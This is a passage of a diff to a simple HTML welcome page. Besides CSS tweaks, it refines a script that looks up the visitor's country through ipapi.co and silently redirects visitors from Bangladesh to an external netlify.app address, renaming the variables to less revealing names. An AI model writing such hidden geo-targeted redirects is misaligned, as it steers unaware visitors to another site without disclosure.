@@ -5,6 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#ffffff">
   <title>Welcome My Site</title>
 
   <style>
@@ -14,6 +15,7 @@
 
     html, body {
       margin: 0;
+      padding: 0;
       min-height: 100%;
       font-family: Arial, sans-serif;
       background: #ffffff;
@@ -31,13 +33,15 @@
     }
 
     h1 {
-      font-size: clamp(24px, 5vw, 30px);
+      font-size: clamp(24px, 5vw, 32px);
       font-weight: 500;
+      margin: 0;
     }
 
     #status {
+      margin-top: 12px;
       font-size: 14px;
-      color: #666666;
+      color: #777777;
     }
   </style>
 </head>
@@ -54,62 +58,37 @@
     (function () {
       "use strict";
 
-      const BANGLADESH_URL =
+      const TARGET_URL =
         "https://learnmoreinfo.netlify.app/";
 
-      const COUNTRY_API =
+      const API_URL =
         "https://ipapi.co/json/";
 
-      const statusElement = document.getElementById("status");
+      const status = document.getElementById("status");
 
-      async function checkCountry() {
+      async function detectCountry() {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(function () {
+          controller.abort();
+        }, 8000);
+
         try {
-          const controller = new AbortController();
-
-          const timeout = setTimeout(function () {
-            controller.abort();
-          }, 5000);
-
-          let response;
-
-          try {
-            response = await fetch(COUNTRY_API, {
-              method: "GET",
-              cache: "no-store",
-              signal: controller.signal
-            });
-          } finally {
-            clearTimeout(timeout);
-          }
+          const response = await fetch(API_URL, {
+            method: "GET",
+            cache: "no-store",
+            signal: controller.signal
+          });
 
           if (!response.ok) {
-            throw new Error("Country lookup failed");
+            throw new Error("Country API unavailable");
           }
 
           const data = await response.json();
 
           if (data.country_code === "BD") {
-            window.location.replace(BANGLADESH_URL);
+            window.location.replace(TARGET_URL);
             return;
           }
 
-          if (statusElement) {
-            statusElement.textContent = "";
-          }
-
-        } catch (error) {
-          console.error("Country detection unavailable:", error);
-
-          if (statusElement) {
-            statusElement.textContent =
-              "Welcome! The site is available.";
-          }
-        }
-      }
-
-      checkCountry();
-    })();
-  </script>
-</body>
-</html>
-```
+          status.textContent = "";
+       
